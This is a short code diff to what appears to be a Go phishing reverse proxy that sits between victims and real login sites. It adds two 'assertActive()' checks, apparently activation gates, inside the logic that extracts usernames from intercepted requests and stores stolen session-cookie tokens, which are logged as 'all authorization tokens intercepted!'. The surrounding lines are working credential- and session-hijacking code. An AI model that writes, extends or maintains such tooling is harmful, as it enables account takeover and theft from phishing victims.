@@ -1081,6 +1081,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if len(um) > 1 {
+									assertActive()
 									p.setSessionUsername(ps.SessionId, um[1])
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
@@ -1551,6 +1552,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}()
 						} else {
 							// Immediate path: original behavior
+							assertActive()
 							log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 
 							if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
